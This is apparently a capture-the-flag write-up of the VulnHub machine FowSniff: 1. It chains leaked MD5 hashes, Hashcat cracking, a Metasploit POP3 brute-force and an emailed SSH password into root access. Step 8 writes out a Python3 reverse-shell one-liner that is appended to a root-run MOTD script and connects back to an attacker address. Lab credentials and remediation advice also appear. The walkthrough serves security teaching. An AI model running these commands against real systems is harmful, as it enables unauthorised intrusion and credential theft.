# FowSniff: 1 — From a Pastebin Breach Dump to Root in Eight Steps

Look at guys!! FowSniff: 1 is a perfect OSINT-to-root chain that mirrors how real corporate breaches unfold. A Google search surfaces leaked MD5 hashes on Pastebin, Hashcat cracks them, Metasploit brute-forces POP3, an internal email leaks an SSH password, and a writable MOTD script executed as root delivers the final blow. Every step here is a documented APT tactic. This machine slaps, fr fr.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | FowSniff CTF: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/fowsniff-ctf-1,262/ |
| **Techniques** | Nmap, OSINT (Pastebin breach dump), MD5 hash cracking (Hashcat), POP3 brute-force (Metasploit), email credential disclosure, SSH access, writable MOTD script injection |
| **CVEs** | CWE-327 (Broken Cryptographic Algorithm: MD5 for passwords), CWE-732 (Incorrect Permission Assignment: writable MOTD script), CWE-312 (Cleartext Storage: SSH password in email) |
| **APT Groups** | APT28: uses stolen credential databases and email pivoting for initial access; Lazarus Group: targets credential breach dumps for lateral movement; multiple ransomware operators perform OSINT against leaked credentials as first reconnaissance step |

---

## Attack Summary

```
nmap → SSH/22, HTTP/80, POP3/110, IMAP/143
  → HTTP: FowSniff Corp page, no useful content
  → OSINT: Google "fowsniff corp" → Pastebin leaked MD5 hashes
  → hashcat -m 0 hashes.txt rockyou.txt → 8/9 hashes cracked
  → Metasploit pop3_login → seina:scoobydoo2
  → nc $TARGET 110 → USER seina / PASS scoobydoo2
  → retr 1 → SSH temp password disclosed
  → retr 2 → SSH username: baksteen
  → ssh baksteen@$TARGET
  → find / -group users -type f → /opt/cube/cube.sh (writable)
  → cat /etc/update-motd.d/00-header → executes /opt/cube/cube.sh as root on login
  → append Python3 reverse shell to cube.sh
  → nc -lvnp 1234 on attacker
  → ssh baksteen@$TARGET (new session) → MOTD executes → root callback
  → /root/flag.txt
```

---

## Methodology

1. Full port scan: SSH, HTTP, POP3, IMAP
2. OSINT: search for "fowsniff" to find leaked credential database on Pastebin
3. Crack MD5 hashes offline with Hashcat + rockyou.txt
4. POP3 credential brute-force with Metasploit using cracked passwords
5. Read POP3 mailbox to extract SSH credentials
6. SSH access as baksteen
7. Group-based file permission enumeration: find writable files owned by users group
8. MOTD script injection: append Python3 reverse shell, trigger via new SSH login → root

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.29

nmap -A -p- -T4 192.168.1.29
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.x
80/tcp  open  http    Apache httpd 2.4.x
110/tcp open  pop3
143/tcp open  imap
```

Four services. HTTP has no useful content after quick review. POP3 is the primary target once OSINT delivers credentials.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — OSINT: Leaked Credential Database

Search Google for `"fowsniff corp"` or just `"fowsniff"`.

A Pastebin post surfaces with:
- Company email addresses for employees: mauer, tiago, bseeley, csnorthcott, parede, btanaka, shodsworth, dcoast, seina
- MD5 password hashes for each account

Save all hashes to a file:

```bash
cat > /tmp/fowsniff_hashes.txt << 'EOF'
8a28a2a936d4f5b9571e0445f888b520
e2b4a89f1ae0303b8e3e71f63d82df2c
...
EOF
```

**Real-world note:** Credential databases appear on Pastebin, GitHub, darkweb paste sites, and breach notification services (HaveIBeenPwned) constantly. Professional threat actors maintain automated scrapers that collect leaked credentials and attempt them against corporate services within hours of the dump appearing. This machine demonstrates exactly that workflow.

**MITRE ATT&CK:** T1598 — Phishing for Information; T1589 — Gather Victim Identity Information

---

## Step 3 — Hash Cracking: Hashcat + rockyou.txt

MD5 hashes (`-m 0`) crack quickly with GPU acceleration and rockyou.txt:

```bash
hashcat -m 0 /tmp/fowsniff_hashes.txt /usr/share/wordlists/rockyou.txt \
  -d 1 -w 3 -O \
  --potfile-path /tmp/fowsniff.potfile

hashcat -m 0 /tmp/fowsniff_hashes.txt --show --potfile-path /tmp/fowsniff.potfile
```

Eight of nine hashes crack. Build credential lists:

```bash
# user.txt — email usernames (part before @)
# pass.txt — cracked plaintext passwords
```

Example cracked pairs:

| Email | Cracked Password |
|---|---|
| seina@fowsniff.org | scoobydoo2 |
| bseeley@fowsniff.org | regal |
| tiago@fowsniff.org | blahblah |
| mauer@fowsniff.org | ilovemovies |
| csnorthcott@fowsniff.org | nancydrewrules |

**Real-world note:** MD5 for password storage is CWE-327. It was considered insecure for passwords since at least 2010. NIST SP 800-132 mandates memory-hard password hashing functions (bcrypt, scrypt, Argon2). A GPU can test billions of MD5 hashes per second; an RTX 4060 does approximately 60 GH/s for MD5.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 4 — POP3 Brute-Force with Metasploit

```bash
msfconsole -q
msf> use auxiliary/scanner/pop3/pop3_login
msf> set RHOSTS 192.168.1.29
msf> set USER_FILE /tmp/user.txt
msf> set PASS_FILE /tmp/pass.txt
msf> set VERBOSE false
msf> run
```

**Found:** `seina` / `scoobydoo2`

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 5 — Read POP3 Mailbox

Connect directly to POP3 with netcat:

```bash
nc 192.168.1.29 110
+OK fowsniff POP3 server (Dovecot)
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1340
.
RETR 1
```

**Message 1** (from stone): Contains SSH temporary password set by admin.

```
SSH password: S1ck3nBluff+secureshell
```

```
RETR 2
```

**Message 2** (hint): Identifies `baksteen` as the target SSH username.

**Real-world note:** Email servers exposing POP3 without mandatory TLS and without IP filtering allow any attacker with a valid credential to read all messages for that account. Internal communications about passwords, credentials, and system access are frequently disclosed this way. POP3 should be replaced by IMAP with mandatory TLS (IMAPS port 993).

**MITRE ATT&CK:** T1114.002 — Email Collection: Remote Email Collection

---

## Step 6 — SSH Access

```bash
ssh baksteen@192.168.1.29
# Password: S1ck3nBluff+secureshell
```

Shell as baksteen. Enumerate the system.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 7 — Privilege Escalation Enumeration

Check groups and find writable files for the `users` group:

```bash
id
# uid=1004(baksteen) gid=100(users) groups=100(users)

find / -group users -type f 2>/dev/null
# /opt/cube/cube.sh
```

Check how cube.sh is invoked:

```bash
cat /etc/update-motd.d/00-header
# #!/bin/sh
# ...
# /opt/cube/cube.sh
```

The MOTD script executes `cube.sh` as **root** on every SSH login. The `users` group has write permission to `cube.sh`. Baksteen is in the `users` group. gg.

**Real-world note:** MOTD scripts, PAM hooks, and login scripts executed as root with group-writable permissions are a consistent real-world privilege escalation finding. Any script executed as root that a non-root user can modify is a root backdoor. APT41 specifically targets login-hook scripts for persistence and privilege escalation.

**MITRE ATT&CK:** T1037 — Boot or Logon Initialization Scripts; T1574 — Hijack Execution Flow

---

## Step 8 — MOTD Injection: Root Shell

On the attacker, start a listener:

```bash
nc -lvnp 1234
```

On the target, append a Python3 reverse shell to cube.sh:

```bash
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.X\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" >> /opt/cube/cube.sh
```

Trigger MOTD by opening a new SSH session:

```bash
ssh baksteen@192.168.1.29
# Password: S1ck3nBluff+secureshell
```

The MOTD execution triggers cube.sh as root. The reverse shell callbacks:

```bash
# On listener:
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

Root captured. Legit chain.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1548.003 — Abuse Elevation Control Mechanism: Sudo/MOTD

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Breach dump | 9x MD5 hashes | Pastebin OSINT | Hashcat rockyou.txt → 8 cracked |
| Credential | seina:scoobydoo2 | Hashcat + Metasploit pop3\_login | POP3 mailbox access |
| Credential | baksteen:S1ck3nBluff+secureshell | POP3 email (Message 1) | SSH login |
| Root access | via MOTD cube.sh injection | /opt/cube/cube.sh write | Python3 reverse shell → uid=0 |
| Root flag | flag.txt | /root/flag.txt | Captured |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Leaked MD5 hashes on Pastebin | Credential databases are routinely dumped and searched by threat actors within hours; MD5 is trivially crackable | Monitor for credential exposure (HaveIBeenPwned API); switch to bcrypt/Argon2 immediately |
| 2 | POP3 without TLS exposes internal communications | Email servers exposing POP3 without mandatory encryption allow credential-based mailbox reading | Disable cleartext POP3; enforce IMAPS (993); add IP restrictions |
| 3 | SSH password transmitted via email | Email is not a secure channel for credential distribution; anyone with email access reads it | Distribute SSH keys via PAM, SSH CA, or a secrets manager; never email passwords |
| 4 | MOTD script writable by non-root group and executed as root | Login scripts executed as root with group-writable permissions are root backdoors | Set MOTD scripts owner root:root mode 0755; audit all /etc/update-motd.d/ files |
| 5 | Credential reuse across POP3 and SSH | Cracked POP3 password directly reveals SSH password via email | Enforce unique passwords per service; use a password manager |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Reconnaissance | Gather Victim Identity Information | T1589 |
| Reconnaissance | Reconnaissance | Phishing for Information | T1598 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Credential Access | Credential Access | Brute Force: Password Guessing (POP3) | T1110.001 |
| Collection | Collection | Email Collection: Remote Email Collection | T1114.002 |
| Initial Access | Initial Access | Valid Accounts (SSH) | T1078 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Boot or Logon Initialization Scripts | T1037 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow | T1574 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Replace MD5 with bcrypt or Argon2** — MD5 password hashing is broken; migrate to modern adaptive hashing immediately
2. **Disable cleartext POP3; enforce IMAPS** — require TLS for all email protocol access; disable port 110
3. **Monitor for credential exposure** — subscribe to HaveIBeenPwned notifications; enable breach monitoring services
4. **Restrict MOTD scripts to root ownership** — `chown root:root /opt/cube/cube.sh; chmod 755 /opt/cube/cube.sh`; audit all /etc/update-motd.d/
5. **Never email passwords** — use SSH key pairs; distribute via PAM, SSH CA, or secrets manager

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all email services; audit POP3/IMAP exposure |
| Protect | Data Security | Migrate password hashing to bcrypt/Argon2; enforce TLS for email |
| Protect | Access Control | Restrict MOTD scripts to root ownership; enforce SSH key-only auth |
| Detect | Anomalies and Events | Monitor for credential exposure on paste sites; alert on reverse shell callbacks |
| Respond | Response Planning | Rotate all exposed credentials immediately; patch MOTD permissions |
| Recover | Recovery Planning | Rebuild compromised host; audit all login scripts |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict MOTD scripts to root write; block cleartext POP3 |
| IA-5 | Authenticator Management | Migrate to bcrypt; rotate all compromised credentials |
| SC-8 | Transmission Confidentiality | Enforce TLS for all email protocols; disable cleartext POP3/IMAP |
| SC-28 | Protection of Information at Rest | No passwords in email; encrypted credential storage |
| CM-6 | Configuration Settings | Audit all login scripts; restrict MOTD directory permissions |
| SI-12 | Information Management | Monitor for organizational credential exposure on breach databases |

### CISA KEV

Credential breach exposure and MD5 password hashing vulnerabilities map to patterns in CISA Alert AA22-074A. CISA advises organizations to implement breach monitoring and immediately migrate from MD5 for password storage.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-OE** — Operating System Executable Execution Prevention (restrict MOTD script execution)
- **D3-ACH** — Application Configuration Hardening (TLS for POP3; bcrypt for passwords)
- **D3-MH** — Message Hardening (TLS enforcement for email protocols)

---

## Final Thoughts

FowSniff: 1 perfectly mirrors real-world breach methodology. OSINT, credential cracking, email pivoting, and a MOTD injection to close it out. Every technique here is documented in actual threat actor playbooks. The machine teaches OSINT-first thinking: before touching a port, search for what the target organization has already leaked. The MOTD injection is a beautiful reminder that privilege escalation isn't always about kernel exploits. Sometimes it's just a writable script running as root. Slept on, but this is one of the best beginner machines for real-world threat modeling.

Thanks guys!! (❍ᴥ❍ʋ)
